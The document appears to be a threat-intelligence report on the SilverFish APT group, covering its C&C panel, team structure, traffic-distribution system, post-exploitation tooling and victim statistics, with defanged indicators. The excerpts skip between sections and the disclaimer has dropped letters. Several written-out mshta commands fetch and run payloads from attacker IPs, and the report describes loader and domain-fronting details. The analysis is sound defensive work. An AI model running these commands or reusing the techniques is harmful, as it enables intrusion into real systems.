Despite the fact that we refrain from making any attribution,\nwe strongly believe that this case will become an important benchmark in terms of\nunderstanding the capabilities of advanced persistent threat (APT) actors, their RoE,\noperation, and TTPs. The report will shed light on one of the world’s most notorious\ncybercriminal organizations in history [16], [11].\n\nIn this report, we were able to analyze various servers and samples allowing us to link\nthe SilverFish group with the infamous SolarWinds attacks, which became public around\nDecember 2020 [3]. Moreover, the PTI Team has uncovered that the same servers were also\nused by EvilCorp [17] which modified the TrickBot infrastructure for the purpose of a large\nscale cyber espionage campaign. EvilCorp is known to be responsible for the development\nand distribution of the Dridex [23] and WastedLocker [6] malware.\n\nAlthough there were numerous articles and technical reports published about the SolarWinds\nattacks and the EvilCorp group [18], [9], [21], [16], [1], it must be noted that this report is\nthe first report which focuses on findings ”behind enemy lines”. Therefore, in this report we\npresent findings from the groups’ infrastructure that we believe will help other researchers\nunderstand the technical complexity of the SilverFish group’s attacks and detect similar\npatterns in the future. This report contains the findings from the C&C server, command\nstatistics, infection dates, targeted sectors and countries, tools used during the attacks,\nexecuted commands, and other information regarding the groups TTP.\n\nThe report is structured as follows : In the following subsection(1.1), we present the timeline of\nour investigation. In Section 2, we provide an executive summary of our research. In Section\n3, a comprehensive technical analysis of the attacks is performed to identify motivation,\ncapability, and background of the group. In Section 4, we offer several statistics regarding\nthe attack campaign. In Section 5, we conclude with some guidance for future research.\nIOCs and references are also be provided at the end of the report. (See Section 6)\n\n\nPlease note that this report has two versions. The ”Private Release” is provided to law\nenforcement agencies, applicable CERTS / CSIRTS, and members of our U.S.T.A. Threat\nIntel Platform (with appropriate annotations and reductions). Likewise, the ”Public\n_Release” is publicly disseminated for the purpose of advancing global fight against_\nhigh-end threat actors and APTs such as SilverFish.\n\n\n3 / 51\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\npro iding an legall applicable arrant regarding completeness or acc rac of the contents Therefore neither this report\n\n\n-----\n\n**Are these the servers used to infect victims in the SolarWinds supply-chain attack?**\n\nWhile this is likely to be inferred from our observations, our research has another focus.\nSupply-chain case contains another attack vector with no visibility on the servers\nwe monitored. What we observed is part of a larger infrastructure that has strong\nconnections with the SolarWinds IOCs (indicators of compromise) shared by the three\ndifferent companies referenced in our report. We can conclude that these servers\nwere most likely involved at some point during the campaign.\n\n**Is this related to TrickBot?**\n\nNo, our research only shows that the SilverFish group is using a similar version\nof the TrickBot infrastructure and codebase. We found evidence of WastedLocker and\nmany TTPs matching only EvilCorp and servers linked with SolarWinds attacks.\n\n**Who are the attackers? Can you identify them?**\n\nWhile our findings shows patterns with known attacks, we do no attribute attacks to a\nparticular geographic zones, types of organisations or persons.\n\n**How would you link it to the SolarWinds attacks?**\n\nFirst of all, there are many servers linked directly to IOCs from the major corporations\nreferenced in our report. We presented these findings so that anyone can easily trace\nthem back using common investigation tools. Second, we see that out of 4700 victims,\nthere is a significant overlap with the companies affected by the SolarWinds attacks.\nThe overlapping victims list is provided in the section 4.2.\n\n**What if your starting point (IOCs shared by these corporations) is wrong to begin**\n**with?**\n\nSolid research requires a solid foundation. Our starting point is based on already\nreported IOCs by two independent sources which are actively investigating this\ncase as well. If we were all wrong then there could be more disturbing scenarios. We\nmight talk about a more capable group which would have breached most of the\noverlapped victims by means of a separate method.\n\n**What happened to the victims and the C&C servers?**\n\nWe distributed the victims list to relevant CERTs in their respective countries.\nWe continue to share more IOCs with certain global threat intel/network security\nvendors who have already started conducting their own analyses and procedures. As\nmore information is revealed and published by other parties, we will connect the dots\nleading to identification of the SilverFish group.\n\n\n4 / 51\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698.

The PTI Team has managed\nto investigate the group’s command and control server and notified the targets of the\nattacks.\n\n**Why does it matter?**\n\nFindings of this report explain various TTPs of threat actor operations, as illustrated by\nexamples directly acquired by the PTI team.\n\nTo date, most of the data available on these high-profile cases were based on\nindicators acquired from the targeted victims. Now, it will be possible to approach the\nmatter from the adversary’s point of view.\n\n**What should be done?**\n\nThis report features many IOCs that can be used by cyber security vendors/incident\nresponse teams to scan their network and detect any infected machines. Owners of\ncritical infrastructures are especially advised to perform these actions. The “Modus\nOperandi” section of this report will help law enforcement agencies adapt their\nstrategies to similar APT threats in the future.\n\n\n5 / 51\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698.

Threat Intel platform and requested a detailed investigation of the breach.\nUnder the scope of this investigation; we have started with the public IOCs published\nby FireEye [8]. Based on one of the domains, it was possible for the PTI Team to create\na unique fingerprint of one of the online servers by using multiple metrics.\n\nDuring the next phase, the PTI Team searched all IPv4 range globally to find a matching\nfingerprint, resulting in positive detections within 12 hours of the scan. Combining and\ninterpreting these findings into a corporate case report in the same month, we have\nprovided our client with a detailed case report and notified all of our members about\nthe fact that our investigation will continue on a much larger scale. The details are\nexplained in Section 3.\n\n## • [JANUARY ’21 :][ At a later stage, the PTI Team enriched its fingerprint/identifier data]\nand started performing retrospective queries on previous global IPv4 scans archived\nfrom past cases. This is a standard practice for the PTI Team as we monitor several\nhigh-profile APT groups and produce internal reports on a daily basis under the purview\nof U.S.T.A. TI operations.\n\n**Analyst Note : According to our internal logs, the servers which were used for C&C over**\nthe attacks were detected by our PTI Team around November 2020 but these were\nmarked as beeing of medium importance as there were no matching fingerprints at\nthat time. Yet, these findings have started to be re-evaluated throughout January\n2021, with constant improvements being made on our identifiers.\n\n## • [FEBRUARY ’21 :][ Based on our findings from the previous months (Nov ’20 to Feb ’21),]\nthe PTI Team performed a final scan that led to several other fundamental findings,\ndetails of which can be found in the Section 3. The PTI Team had to overcome different\ntechnical challenges to analyze and successfully de-anonymize C&C servers of this\noperation. Throughout February 2021, the PTI Team has worked on different C&C servers\nto fully understand/identify the attackers’ motives. Following each discovery, individual\nIOC notifications were created and sent to members of the U.S.T.A. platform to enable\na swift remediation.\n\n## • [MARCH 1ST - 7TH, ’21 :][ Since the beginning of March ’21; the PTI Team has started]\nnotifying victims through law enforcement agencies, strategic partners, and CERTS /\nCSIRTS in the regions which are affected by the SilverFish Group. Detailed IOCs and\nbrief reports have been published to all applicable parties during this term as a public\nresponsibility. In each of these notifications, the PTI Team has been extremely cautious\nabout preserving each organization’s privacy and confidentiality.\n\n**Side Note : Throughout our research on SilverFish, different partnerships have been**\nestablished with globally recognized threat intelligence vendors and private IR teams\nby notifying them about certain threats that may be posing a risk to their clients.\n\n6 / 51\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\npro iding an legall applicable arrant regarding completeness or acc rac of the contents Therefore neither this report\n\n\n-----\n\n## • [MARCH 15TH, ’21 :][ The final report was approved by our advisory board and an initial]\nprivate version was shared with Polcant (Vaud Cantonal Police Cybercrime Division _Switzerland) to engage the relevant law enforcement authorities._\n\n## • [MARCH 17TH, ’21 :][ On March 17th 2021, the PTI Team published the][ ”Public Release”]\nversion of the report to further enlighten several organizations who continue to be\ntargeted by SilverFish. As of the issue date of this report; SilverFish actors are still\nusing relevant machines for lateral movement stages of their campaigns. Unfortunately,\ndespite being large critical infrastructures, most of their targets are unaware of the\nSilverFish group’s presence in their networks.\n\n### 2 Executive Summary\n\n#### 2.1 Overview\n\nThe Executive Summary section of this report is provided to draw a non-technical\nexecutive outline of the SilverFish group, which was found to have carried out an\nextremely sophisticated cyber-attack on at least 4720 targets, including but not limited to\ngovernmental institutions, global IT providers, the aviation industry, and defense companies.\nDetected to have multiple relations with the notorious SolarWinds incident of the past\nquarter and the globally recognized EvilCorp group, we believe this case to be an important\ncornerstone in terms of understanding capabilities of organized threat actors. Please note\nthat, all the matters mentioned herein will be explained in further technical detail in the later\nsections of this report.\n\nThis report includes various **discoveries** related to an extremely well-organized\ncyber-espionage group which are thought to have strong ties with notorious Solarwinds,\nEvilCorp that compromised several states and critical infrastructures. We believe; our findings\nwill reveal several previously-unknown tools, techniques and procedures related to one of\nthe most high-profile APT groups in history.\n\n**Figure 1.

We were able to verify\nall victims which publicly admitted/rumored being targeted by SolarWinds attacks\nwithin the C&C panel. Some of the notable victims are as follows :\n\n## • [A three letter US Agency]\n • [A globally recognized US military contractor]\n • [At least 5 globally leading IT manufacturers and solution providers]\n • [Multiple top-tier automotive manufacturing groups from Europe]\n • [Multiple aviation and aerospace manufacturing/RD companies]\n • [Dozens of banking institutions from the US and the EU with millions of client]\nportfolios\n\n## • [Public Health Departments from Multiple Regions]\n • [More than three Police Networks]\n • [Several Airport Systems in Europe]\n • [Dozens of US public institutions, including 3 which have already admitted being]\nhacked\n\n## • [3 of the world’s largest auditing/consulting groups]\n • [At least 4 Globally recognized IT security vendors]\n • [A globally recognized pharmaceutical companies]\n • [A global organization comprised of 193 countries]\n • [One of the world’s leading COVID-19 testing kit manufacturers]\n\n\nAfter detecting an online domain (databasegalore[.]com) from previously published IOCs, it\nwas possible for the PTI Team to further analyze the incident and find yet-to-be-discovered\nC&C servers by means of large-scale network scans.\n\nThis enabled the PTI Team to access the management infrastructure (i.e., the C&C server) of\nthe SilverFish group and to acquire further information about the group’s modus operandi\nincluding but not limited to IPs and usernames of the victims, commands executed on the\nvictims’ machines, activity time of the SilverFish group, comments written for each victim,\nand prioritization of operations.\n\n#### 2.3 Characteristics of the SilverFish Group\n\n**Formed by Multiple Teams : When taking its first look inside the C&C server, the PTI Team**\nobserved that main dashboard of the SilverFish C&C panel features a section named ”Active\nTeams”, involving several comments entered by different user groups such as Team 301, Team\n302, etc. Such a design indicates that this infrastructure is meant for multiple teams. Most\ncomments entered by attackers for each victim are mostly in English and Russian and include\nurban slang.\n\n8 / 51\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\npro iding an legall applicable arrant regarding completeness or acc rac of the contents Therefore neither this report\n\n\n-----\n\n**Advanced Post Exploitation Skillset : Executed commands and specially crafted scripts used**\nby the SilverFish group strongly indicates sophistication and an advanced post-exploitation\nskillset. There are multiple attempts for pivoting to internal systems on critical infrastructure\nafter the initial domain enumeration of victims.\n\n**Exclusively Targeting Critical Infrastructures in the US and EU : Following a detailed inspection**\non the C&C panel, PTI Team has seen that the SilverFish group has exclusively targeted\ncritical infrastructures. Nearly all critical infrastructures (as defined in the NIST Cyber Security\nFramework [14]) have been successfully compromised. Approximately half of the victims were\nwitnessed to be corporations which have a market value of more than 100 million USD, as\nper their public financial statements.\n\nWhile the United States is by far the most frequently targeted region, with 2465 attacks\nrecorded, it is followed by European states with 1645 victims originating from no less than 6\ndifferent member states.\n\n**Focus on Recon and Covert Data Exfiltration : Upon analyzing the custom scripts and tools**\ncreated by the SilverFish group, the PTI Team came to the conclusion that the main goal\nof this APT group is most likely to perform reconnaissance and exfiltrate data from target\nmachines in a covert manner.\n\n**Using Enterprise Victims as a Real-Life Sandbox : The PTI Team has observed that the**\nSilverFish group has designed an unprecedented malware detection sandbox formed by\nactual enterprise victims, which enables the adversaries to test their malicious payloads on\nactual live victim servers with different enterprise AV and EDR solutions, further expanding\nthe high success rate of the SilverFish group attacks.\n\nWorking much like VirusTotal but with actual live victim servers, this platform (which we dub\n_”VictimTotal” 3.4) of the SilverFish campaign was observed to be including two different_\nmalicious files that had been previously scanned, under the names, ”buildus9_3.ps1” and\n”build_eu.ps1” indicating a separate preparation for different regions.\n\n**Highly Organized Working Patterns : Another interesting finding was the level of hierarchy**\nin the C&C server, enabling management of different targets, assignment of these targets\nto different groups and triaging incoming victims to appropriate SilverFish group members.\nFurther information about this detailed structure can be found in Section 3.1.2, titled Team\nHierarchy.\n\n**Working in Strict Shifts : As discussed in 4.3, the PTI Team has also gathered data about the**\nworking habits of the SilverFish group. Upon careful inspection it was discovered that the\ngroup has worked according to a specific timeline : namely, between the hours of 8:00 AM\nand 8:00 PM (UTC). Additionally, the group was observed to be far more active on weekdays,\nMonday through Friday.\n\n**Other Possible Campaigns Against Different Regions : As explained throughout the report,**\nour discoveries involving SilverFish were exclusively related to the US and EU. That said,\nthere may be other ongoing operations targeting other parts of the world. We base this\nassumption on the fact that the SilverFish group is observed to be extremely organized and\ncapable of enacting the exact same structure for other regions of interest.\n\n9 / 51\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698.

Among the published domain names,\n**databasegalore.com was the only one accessible during the investigation. The host server**\nalso contained an active PowerMTA service on port 2304. After performing web directory\nfuzzing, an another file (example.php) has been identified by the PTI Team.\n\n**Figure 2. Fingerprint of an existing IOC matching another server instance**\n\n**Analyst Note : PowerMTA is an enterprise-grade email message transfer agent (MTA) for**\nsending high-volume, business-critical emails.\n\n10 / 51\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698.

After 12 hours, the PTI Team\nidentified more than 200 hosts with the similarities mentioned above. After filtering the false\npositive results, the PTI Team detected the C&C servers of the SilverFish group.\n\n**Analyst Note : In order to avoid future confusion, we have redacted the initial discovery**\nphase from the TLP : WHITE version as we are unable to provide further details in order to\npreserve our proprietary technology in this field.\n\nAfter gaining access to the C&C server on the subject host, we were not expecting to land\non the most critical piece of SilverFish infrastructure. One of the first thing we tried is to verify\nif the victims have some kind of relation with the SolarWinds software. Upon closer inspection\nof the C&C data, we were able to observe many victims using SolarWinds products(see in\nFigure 3). This was an important milestone as we started our investigation from the IOCs of\nthe SolarWinds attack, traced that link to the C&C, and observed similar artifacts on the\nserver as well. A detailed analysis of the C&C is explained in the next section. (Section 3.1).\n\n**Figure 3.

The main\ndashboard only contains the infected victims, generic comment section for each victim and\nseveral options for filtering the victims.\n\n**Figure 4. Command and control panel dashboard**\n\nDuring the C&C server analysis, the PTI Team noticed that one of the filter options was called\n”Active team”.

One of\nthe most expected observation is that the SilverFish group used many common techniques\nto harden the server. Firstly, the group installed and configured AppArmor which is a common\npractice to allow running applications in an isolated environment. Secondly, all collectable\nlogs inside the operating system (web access logs, ssh auth log, console history etc.) were\ndisabled. Lastly, network firewall is configured to communicate only with pre-defined IP\nAddresses (Figure 10).\n\n**Figure 10. Firewall configuration of the server**\n\nOne of the most notable findings from the server-side is the web proxy configuration. We\ndiscovered several crucial domains belonging to a range of nodes including TDS and C&C\nproxies. An example of configuration is provided in Figure 11 and all of the domains can be\nfound in Section 6.\n\n**Figure 11. Proxy configuration of the server**\n\nNext, The PTI Team tried to access the previously assigned IP address directly with\na GET request and immediately observed a redirection to securesearchnow[.]com\ndomain. This finding was important because it linked 209.99.40.223 IP with both\n**secureconnectiongroup[.]com and securesearchnow[.]com domains. Moreover, the PTI Team**\nobserved that several IPs in that range also points requests to the securesearchnow[.]com\ndomain. The similarity between domain names is another aspect of the correlation which\nshould not be disregarded.\n\n16 / 51\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698.

Both of the web servers redirect the visitors to a PHP script hosted at\nfreeresultsguide[.]com. Ideally, we would like to analyze the source code of sk-jspark_init.php.\nHowever, the PTI Team could not find the code of the script during the writing of this report.\nWe believe it might give some other clue about the SilverFish group. In any case, we will\ninclude it in our repository once it’s been analyzed by us or by any other research group.\nOn March 4, 2021 Microsoft published another set of IOCs in their blog [20] related with\nSolarWinds attackers. It is worth noting that reyweb[.]com domain in their list also resolves to\n208.91.198.23 which can be traced back to SilverFish group’s C&C server.\n\n17 / 51\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698.

Team structure of SilverFish**\n\nWhile significant attention has been focused on reversing and identifying the tools of\nthe SilverFish group, victim handling and team management methodology should also be\ndiscussed in detail. In general, command and control servers are managed with a single or\nmultiple administrator accounts. It is not common to see multiple accounts with different\npermission levels to manage a C&C server. SilverFish uses a team based workflow model\nand a triage system similar to modern project management applications like Jira (see\nFigure 14). Whenever a new victim is infected, it is assigned to the current ”Active Team”\nwhich is pre-selected by the administrator. Each team on the C&C server can only see the\nvictims assigned to them. Furthermore, the system has the capability to auto-assign victims\nbased on the current workload. During our investigation, we found four different teams\n(namely 301,302,303,304) who were actively exploiting the victims’ devices. These teams\ncycle frequently almost every day or every two days. In Section 4.3, we present ”Attacker\n_Activity Time Graph” to urge further exploration of the group’s working hours._\n\n**Figure 14. Team assignment for each victim**\n\nMoreover, there are clues indicating that multiple users are managing the SilverFish TDS panel\nthat is analyzed in the next 3.2 section of this report. Each user is able to write comments\nfor each victim to prioritize the exploitation. Based on these comments, we were able to\nunderstand more about the motivation of the group and prioritization of the victims. It is also\nimportant to mention that most of the comments are written in Russian slang and vernacular.\n(”dno”,”pidori”, ”poeben”, ”poebotina”, ”psihi”, ”hernya”, ”xyeta”, ”gavno”)\n\n18 / 51\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\npro iding an legall applicable arrant regarding completeness or acc rac of the contents Therefore neither this report\n\n\n-----\n\nAnother significant finding is that the C&C source code\n(within PHP files) statically contain nicknames and ID\nnumbers of 14 people who most likely work under the\nsupervision of 4 different teams.\n\n## • [511 : fingerlink]\n • [513 : cyberbro fingerlink]\n • [514 : vie new]\n • [515 : riki netsupport]\n • [516 : cyberbro netsupport]\n • [520 : infoshell]\n • [521 : riki2509 new hacker]\n • [522 : cyberbro client eu]\n • [565 : all local]\n • [566 : new hacker]\n • [567 : art]\n • [567 : mes]\n • [576 : g test]\n • [577 : walter]\n\nThe PTI Team linked some of these nicknames with profiles\nin different underground hacking forums. We present some\nof the interesting posts which correlates the nicknames\nwith the malicious activities carried out by the SilverFish\ngroup. It should be noted that attribution using only\nnicknames can be misleading.\n\n**Figure 15.

The TDS panel is used for\ndistributing the victim callback traffic into multiple C&C servers and balancing the high\namount of victim traffic [5]. It also enables the SilverFish group to filter the incoming victims\nby country.\n\n**Figure 16. TDS dashboard page**\n\nDuring the PTI Team investigation, the SilverFish TDS web panel was configured to accept\nvictims from the following countries.\n\n## • [USA]\n • [Canada]\n • [Netherlands]\n • [Germany]\n • [England]\n • [Mexico]\n • [France]\n • [Italy]\n • [Spain]\n • [Australia]\n • [Portugal]\n • [Austria]\n • [Denmark]\n\nThe list of proxy domains used for bouncing victim traffic before reaching the C&C server are\nlisted in the IOC section 6.2 of this report.\n\n20 / 51\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\npro iding an legall applicable arrant regarding completeness or acc rac of the contents Therefore neither this report\n\n\n-----\n\nDepending on the analysis made on the TDS panel, the PTI Team believes\nthat the traffic distribution is achieved by injecting the following malicious\nPHP and JavaScript codes into multiple legitimate websites. Injected\ncode checks the host, referrer, and cookie headers for the expected\nvalues on every incoming request and sends an HTTP GET request to the\n**hxxp://mwkh.adsprofitnetwork.com/wordpressComposerUpdate?phpcid=250&php**\naddress by appending the &hn=%URL-ENCODED-REQUEST-HOSTNAME% parameter.\nThe related response is written to the local ./wp-assets.php file, then the first 8 bytes\nof the response are encoded into HEX and relayed to the client.\n\n\n**Figure 17. TDS - Injection code**\n\nDuring its investigation, the PTI Team witnessed the SilverFish group switching the TDS proxy\ndomains multiple times in a day.\n\n#### 3.3 Post Exploitation Analysis\n\nAfter analyzing the executed victim tasks inside the command and control server, the PTI\nTeam obtained lots of details about the SilverFish group’s post-exploitation TTP. We were\nalso be able to link our fingerprint which was extracted from one of the SolarWinds IOCs\nwith an IP listed as a second-stager within the C&C panel (See Figure 20). The executed\ntasks paint a clear picture of the motive, targets and priorities of these sophisticated\nattackers. After gaining initial foothold over the system, the SilverFish group uses publicly\navailable red teaming tools such as Empire, cobalt strike, koadic loaders, and, in several\ncases PowerSploit and Mimikatz post exploitation Powershell scripts. Additionally, there are\nlots of specially crafted Powershell, BAT, CSPROJ, JavaScript and HTA files that are mainly\nused for enumeration and data exfiltration. After analyzing the command and control servers\nof the SilverFish group, the PTI Team collected all the commands executed on victim devices.\nResults of the analysis made on the collected commands indicate a strong behavioral\npattern. The following table contains the most frequently used six commands executed by\nthe SilverFish group along with brief explanations of each.\n\n21 / 51\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698.

After\nlisting the domain controllers and the trust relationship between the domains, the SilverFish\ngroup usually focuses on enumerating the infected device itself.\n\n**Figure 18. Frequently used commands for enumeration**\n\nAmong the executed commands there are multiple occurrences of external script execution\nusing the WebClient.DownloadString method. Some of the executed scripts are well-known\npost-exploitation scripts such as PowerShellEmpire, Powertools [4], Invoke-SocksProxy [15],\nand Mimikatz [7]. Unfortunately the PTI Team could not obtain the rest of the files downloaded\nwith this method.\n\n**Figure 19. Frequently used commands for enumeration**\n\nAll the addresses of external scripts downloaded via the WebClient.DownloadString method\ncan be accessed from the Section 6.10.\n\n22 / 51\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698.

The IP was**\nserving the same bootstrap theme on port 80 and PowerMTA service on port 9897 (see in\nFigure 20).\n\n**Figure 20. IP within C&C linking back to another server with the same fingerprint**\n\n**3.3.1** **Koadic Agents**\n\nOne of the other post-exploitation tools used by the SilverFish group is the publicly known\nKoadic project [24].\n\n**Analyst Note : According to Koadic author ”Koadic, or COM Command & Control, is**\na Windows post-exploitation rootkit similar to other penetration testing tools such as\nMeterpreter and Powershell Empire. The major difference is that Koadic does most of\nits operations using Windows Script Host (a.k.a. JScript/VBScript), with compatibility in\nthe core to support a default installation of Windows 2000 with no service packs (and\npotentially even versions of NT4) through Windows 10.”\n\n23 / 51\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698.

The following list contains every external IP address\nthat is used for executing HTA code.\n\n## • [mshta hxxp://104.128.228.76:9999/PAf3W]\n • [mshta hxxp://149.154.157.248:21/KDnbc]\n • [mshta hxxp://149.154.157.248:443/HRNrz]\n • [mshta hxxp://149.154.157.248:443/HRNrz]\n • [mshta hxxp://149.154.157.248:443/veUlx]\n • [mshta hxxp://149.154.157.248:445/SlaMn]\n • [mshta hxxp://149.154.157.248:8080/KDnbc]\n • [mshta hxxp://149.154.157.248:8080/SlaMn]\n • [mshta hxxp://149.154.157.248:80/SlaMn]\n\nThe PTI Team was able to obtain and analyze one of the HTA scripts executed inside a\nvictim’s device. After the initial analysis, the PTI Team came to the conclusion that this HTA\nscript was a obfuscated Koadic agent. The analyzed Koadic sample was accessible on\naddress hxxp://104.128.228.76:9999/PAf3W during the investigation.\n\n**Figure 21.

The initiating function of the script is named Sarasota and was most\nprobably written by the SilverFish group. The encoded form of Sarasota script in the following\nimage was executed on more than 200 victims’ machines.\n\n**Figure 23. Sarasota script execution task on C&C**\n\nThe decoded contents of the Sarasota script contains functions for searching domain objects\nin the domain active directory structure. This allows the SilverFish group to find any type of file\nor folder stored inside a target domain active directory. The script includes several parameters\nfor searching the domain objects. It is able to enumerate the printers inside the domain and\ncomputers with unconstrained delegation before performing the search. Moreover, it is able\nto filter computers with specific SPNs, operating systems, service packs and server references.\nSarasota script is also able to run with or without valid domain credentials.\n\n**Figure 24.

Almost all of the Cobalt Strike payloads are executed with compressed\nand encoded Powershell commands. The decoded and decompressed Powershell\ncommands contains another Powershell loader script. The second stage script extracts the\nBASE64 Cobalt Strike beacon payload and decodes it by performing an XOR operation with\nthe key 53.\n\n**Figure 25. Decoded Cobalt Strike beacon loader Powershell code**\n\nExecuted Cobalt Strike beacons use domain fronting for communicating to the command\nand control server. The PTI Team was able to extract all of the Cobalt Strike beacons used\nby SilverFish attackers. Following table contains the Cobalt Strike command and control\nservers and list of domains used for fronting.\n\n**Analyst Note : Domain fronting is a technique for Internet censorship circumvention that**\nuses different domain names in different communication layers of an HTTPS connection\nto discreetly connect to a different target domain than is discernable to third parties\nmonitoring the requests and connections [13].\n\ncdn.auditor.adobe.com twimg-us.azureedge.net\nvideo.oracle.com d3ser9acyt7cdp.cloudfront.net\n\n26 / 51\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698.

At first glance, PTI team observed that the files are heavily\nobfuscated and the main payload is encrypted using AES encryption.\n\n**Figure 32. Encoded contents of buildus9_3.ps1 file**\n\nAfter de-obfuscating and extracting the decrypted payload inside the Powershell files, we\ncame across another Powershell stub that decodes another BASE64 encoded payload using\n6 byte XOR keys. Once the second script executed using Invoke-Expression, it first creates\na folder under the %APPDATA% directory with a random name. After creating the random\ndirectory script removes all the files with ”.ps1” extension under the %TEMP% directory. This\ncould mean that this script is meant to be executed under the %TEMP% directory.\n\n**Figure 33. Extracted payload removing all ”.ps1” files under %TEMP% directory**\n\nThen the script writes the decoded contents of the BASE64+XOR encoded payload\ninto a randomly named ”.zip” file under the created directory. In the next line of\ncode script extracts the ZIP file contents using expand-archive. After analyzing the\nextracted contents of the ZIP file, PTI Team found out that extracted files belongs to\na publicly known multi platform remote managing software called NetSupportManager\n\n[10]. The script continuous the execution by removing the ZIP file and renaming the\n**client32.exe of NetSupportManager to ctfmon.exe.

Both IP addresses are registered to a domain.\nIn contrast to traditional attacks that use a domain name purchased via means of anonymous\npayments, SilverFish is using hacked domains for redirecting traffic to their command and\ncontrol panel. We observed 10-year old legitimate domain names used in their operation.\nTo avoid disrupting the legitimate traffic of the website, the SilverFish group is creating\nnew subdomains which makes it almost impossible for an unattended website owner to\nunderstand that their domain is being exploited in the attacks. The analysis made on the\nC&C servers, revealed that the SilverFish group is found to be filtering out the victims from\ncommonwealth of independent states(CIS). Following image displays the source code of the\ntraffic distribution system(TDS), which is explained in section 3.2 in detail.\n\n**Figure 36. Source code of TDS filtering CIS countries**\n\nAs seen in the TDS source code, the SilverFish group clearly discarding the victims originating\nfrom the following list of states.\n\n## • [Azerbaijan]\n • [Armenia]\n • [Belarus]\n • [Georgia]\n • [Kazakhstan]\n • [Kyrgyzstan]\n • [Moldova]\n • [Russia]\n • [Tajikistan]\n • [Turkmenistan]\n • [Uzbekistan]\n • [Ukraine]\n\n32 / 51\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698.

Therefore, we didn’t see a necessity to conduct an OSINT analysis for the domain\ninformation as it would be misleading. Our research also shows that significant number of\nthe compromised websites were using Wordpress. According to our historic research on APT\ngroups, there is a tendency to buy credentials from underground markets. However, the\namount of compromised websites with the same software shows us that the SilverFish group\nmight also be leveraging 0-day or N-day exploits.\n\n### 4 Statistics & Observations\n\nThis section is provided for the purpose of emphasizing certain aspects of SilverFish’s\nimpact on different sectors and countries. Moreover, it was possible for the PTI Team to\ninterpret certain behavioral patterns of threat actors by means of their activity timelines.\n\n**Figure 37. Campaign timeline**\n\nThere are a large number of published articles about SolarWinds case. In this section, we\npresent our findings from the C&C server which matches the actions of the SilverFish group\nwith the timeline of the SolarWinds attack campaign. Firstly, we observed the victim around\nthe end of August. We came to this conclusion as the first victim’s ID was 1 within the\ndatabase. However, there might be other C&C infrastructures which have a separate victim\ndatabase. Secondly, infections paused around middle of November and gain momentum\nduring January ’21. The reason of this might be related with the joint collaboration of many\norganizations to shutdown the operation and the effect of a patch release by SolarWinds.\nThe rest of this section contains infection rates, affected countries, and victim distributions.\n\n33 / 51\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698.

